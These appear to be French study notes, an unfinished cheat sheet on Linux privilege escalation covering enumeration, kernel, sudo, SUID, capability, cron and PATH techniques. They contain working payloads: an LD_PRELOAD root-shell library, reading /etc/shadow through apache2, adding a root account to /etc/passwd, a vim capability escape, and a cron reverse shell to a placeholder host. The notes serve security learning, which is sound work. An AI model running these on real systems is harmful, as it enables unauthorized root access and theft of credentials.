# Principe des privileges Linux
* blabla


## 1) L'énumération du système
1. `hostname` : Retourne le nom d'hôte de la machine cible.
2. `uname -a` : Affiche des informations sur le système, y compris des détails sur le noyau.
3. `/proc/version` : Donne des informations sur la version du noyau et peut indiquer si un compilateur est installé.
4. `/etc/issue` : Peut fournir des informations sur le système d'exploitation.
5. `ps` : Affiche les processus en cours d'exécution sur un système Linux.
```
ps -A : Affiche tous les processus en cours d'exécution
ps -axjf : Affiche l'arbre des processus 
ps -aux : afficher les processus de tous les utilisateurs (a), l'utilisateur qui a lancé le processus (u) processus qui ne sont pas attachés à un terminal (x). 
```
1. `env` : Affiche les variables d'environnement.
```
SHELL
HOME
PATH : Contenir un compilateur ou un langage de script (par exemple Python) qui pourrait être utilisé pour exécuter du code sur le système cible ou être exploité pour une escalade des privilèges.
```
1. `sudo -l` : Liste toutes les commandes que votre utilisateur peut exécuter avec sudo.
2. `ls` : Permet de lister les fichiers dans un répertoire. Utilisé avec `-la`, il affiche également les fichiers cachés.
3. `id` : Fournit une vue d'ensemble du niveau de privilège de l'utilisateur et de ses adhésions à des groupes.
4. `/etc/passwd` : Lire ce fichier peut aider à découvrir les utilisateurs sur le système.
```
cat /etc/passwd | cut -d ":" -f 1 | grep home
```
1. `history` : Peut donner une idée des commandes précédemment exécutées.
2. `ifconfig` : Donne des informations sur les interfaces réseau du système.
3. `netstat` : Peut être utilisé pour recueillir des informations sur les connexions existantes.
```
netstat -a : affiche tous les ports d'écoute et les connexions établies
netstat -ano : Affiche toutes les sockets, Ne pas résoudre les noms, Affiche les minuteries
netstat -at : lister les protocoles TCP 
netstat -au : lister les protocoles UDP
netstat -l : liste les ports en mode "écoute". Ces ports sont ouverts et prêts à accepter des connexions entrantes.
netstat -s : liste les statistiques d'utilisation du réseau par protocole
netstat -tp : liste les connexions avec le nom du service et les informations PID
netstat -i : Affiche les statistiques de l'interface
```
1. `find` : Utile pour rechercher des fichiers ou des répertoires avec des caractéristiques spécifiques.
```
find . -name flag1.txt : recherche le fichier nommé "flag1.txt" dans le répertoire actuel
find /home -name flag1.txt : recherche le fichier nommé "flag1.txt" dans le répertoire /home
find / -type d -name config : recherche le répertoire nommé config sous "/"
find / -type f -perm 0777 : recherche les fichiers avec les permissions 777 (fichiers lisibles, inscriptibles et exécutables par tous les utilisateurs)
find / -perm a=x : recherche les fichiers exécutables
find /home -user frank : recherche tous les fichiers de l'utilisateur "frank" dans "/home".
find / -mtime 10 : recherche les fichiers qui ont été modifiés au cours des 10 derniers jours
find / -atime 10 : recherche les fichiers qui ont été accédés au cours des 10 derniers jours
find / -cmin -60 : recherche les fichiers modifiés au cours de la dernière heure (60 minutes)
find / -amin -60 : recherche les fichiers accédés au cours de la dernière heure (60 minutes)
find / -size 50M : recherche les fichiers d'une taille de 50 MB

Dossiers et fichiers dans lesquels il est possible d'écrire ou à partir desquels il est possible d'exécuter un programme :

find / -writable -type d 2>/dev/null : recherche les dossiers sur lesquels le monde peut écrire.
find / -perm -222 -type d 2>/dev/null : Recherche des dossiers accessibles en écriture dans le monde
find / -perm -o w -type d 2>/dev/null : Trouver les dossiers inscriptibles dans le monde

Recherche des dossiers exécutables dans le monde entier
find / -perm -o x -type d 2>/dev/null

Trouver les outils de développement et les langages pris en charge :
find / -nom perl*
find / -nom python*
find / -nom gcc*

Trouver les fichiers avec le bit SUID, qui nous permet d'exécuter le fichier avec un niveau de privilège supérieur à celui de l'utilisateur courant.
find / -perm -u=s -type f 2>/dev/null
```

## 2) Automatisation de l'énumération 
- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

## 3) Kernel Exploits
1. Identifier la version du Kernel
```
uname -a
cat /proc/version
```
2. Rechercher et trouver un code d'exploitation pour la version du noyau
	* Google
	* [LinuxKernelcves](https://www.linuxkernelcves.com/cves)
	* [Exploit-db](https://www.exploit-db.com/)
	* [searchsploit](https://www.exploit-db.com/searchsploit)
	* Utiliser un script comme LES (Linux Exploit Suggester)
3. Exploiter la faille 

## 4) Sudo Exploits
* Sudo permet à certains utilisateurs d'obtenir des droits administrateurs sur un court instant pour executer une commande 
* Certains utilisateurs peuvent avoir des accès sudo à certaines commandes spécifiques
* Vérifier sa situation sudo 
```
sudo -l
```
* Utiliser le site [gtfobins](https://gtfobins.github.io/) pour savoir les possibilités d'exploits en fonction des droits sudo trouvés
1. **Exploitation des fonctions de l'application** :
Cette méthode consiste à utiliser une fonctionnalité d'une application pour révéler des informations sensibles. L'exemple donné concerne le serveur Apache2, qui a une option (-f) permettant de charger des fichiers de configuration alternatifs. En demandant à Apache de charger le fichier /etc/shadow (qui contient les hachages des mots de passe des utilisateurs), le serveur génère un message d'erreur qui comprend la première ligne de ce fichier.
```
apache2 -f /etc/shadow
```
    
2. **Exploitation de LD_PRELOAD** :
LD_PRELOAD est une fonctionnalité qui permet à un programme d'utiliser des bibliothèques partagées avant toute autre bibliothèque. Si un utilisateur peut exécuter une commande avec sudo et que l'option env_keep est activée pour LD_PRELOAD, il est possible d'injecter une bibliothèque partagée qui exécute du code malveillant avant le programme cible.
```
#include <stdio.h> 
#include <sys/types.h> 
#include <stdlib.h>  

void _init() {   
	unsetenv("LD_PRELOAD");   
	setgid(0);   
	setuid(0);   
	system("/bin/bash"); 
	}
```
Ce code peut être sauvegardé en tant que shell.c et compilé en une bibliothèque partagée (shell.so) en utilisant gcc avec les options appropriées :
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
Ensuite, cette bibliothèque partagée peut être utilisée lors de l'exécution d'un programme avec sudo en spécifiant l'option LD_PRELOAD, ce qui entraînera le lancement d'un shell avec les privilèges root :
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

## 5) SUID/SGID Exploit 
* SUID (Set-user Identification) et SGID (Set-group Identification). permettent aux fichiers d'être exécutés avec le niveau de permission du propriétaire du fichier ou du propriétaire du groupe, respectivement.
* Lister les fichiers dont les bits SUID ou SGID sont activés.
```
find / -type f -perm -04000 -ls 2>/dev/null
```
* Comparer les exécutables avec [GTFOBins](https://gtfobins.github.io/#+suid) 
* Créer un fichier craquable par John The Ripper à partir du /etc/passwd et /etc/shadow
```
unshadow passwd.txt shadow.txt > passwords.txt
```
* Ajouter un nouvel utilisateur disposant des privilèges de l'administrateur (root) Nous aurons besoin de la valeur de hachage du mot de passe que nous voulons que le nouvel utilisateur ait. Cela peut être fait rapidement en utilisant l'outil openssl
```
openssl passwd -1 -salt TOTO password1 
-1 : MD5 crypté doit être utilisé
-salt TOTO: sel specifique 
password1 : mot de passe donné
```
* On ajoute le hash généré avec un login dans /etc/passwd avec le bash /bin/bash 
```
hacker:@HASH:0:0:root:/root:/bin/bash
```

## 6) Capacités Exploit
* Les capacités permettent de gérer les privilèges à un niveau plus granulaire.
* Par exemple, si l'analyste SOC a besoin d'utiliser un outil qui doit initier des connexions de socket, un utilisateur normal ne sera pas en mesure de le faire. Si l'administrateur système ne souhaite pas accorder à cet utilisateur des privilèges plus élevés, il peut modifier les capacités du binaire. Ainsi, le binaire pourra accomplir sa tâche sans avoir besoin d'un utilisateur aux privilèges plus élevés.
* L'outil getcap permet de lister les capacités activées
```
getcap -r / 2>/dev/null
```
* Selon les executables trouvés on cherche comment les lancer en mode root 
* Exemple pour Vim 
```
./vim -c ':py3 import os; os.setuid(0);os.execl("/bin/sh", "sh", "-c","reset; exec sh")'
```

## 7) Crontabs Exploit
* Les tâches Cron sont utilisées pour exécuter des scripts ou des binaires à des moments précis
* Ils s'exécutent avec les privilèges de leurs propriétaires et non de l'utilisateur actuel
* L'idée est simple : s'il existe une tâche planifiée qui s'exécute avec les privilèges de l'utilisateur root et que nous pouvons modifier le script qui sera exécuté, alors notre script s'exécutera avec les privilèges de l'utilisateur root.
* Se rendre dans `/etc/crontab`
```
cat /etc/crontab
```
* Réperer un fichier qui s'execute regulierement et qui appartient à root et le modifier pour obtenir un reverse shell en root directement 
```
#!/bin/bash
bash -i >& /dev/tcp/@ip/@port 0>&1
```

## 8) PATH Exploit
* PATH sous Linux est une variable d'environnement qui indique au système d'exploitation où rechercher les exécutables. Pour toute commande qui n'est pas intégrée à l'interpréteur de commandes ou qui n'est pas définie par un chemin absolu, Linux commence à chercher dans les dossiers définis dans PATH
* Se poser les questions suivantes 
	* Quels sont les dossiers situés sous $PATH ?
	* Votre utilisateur actuel a-t-il des privilèges d'écriture pour l'un de ces dossiers ?
	* Pouvez-vous modifier $PATH ?
	* Existe-t-il un script/une application que vous pouvez lancer et qui sera affecté(e) par cette vulnérabilité ?

# Insecure File Permissions
* Cron

# Insecure File Permissions
* /etc/passwd

# Kernel Vulnerabilities: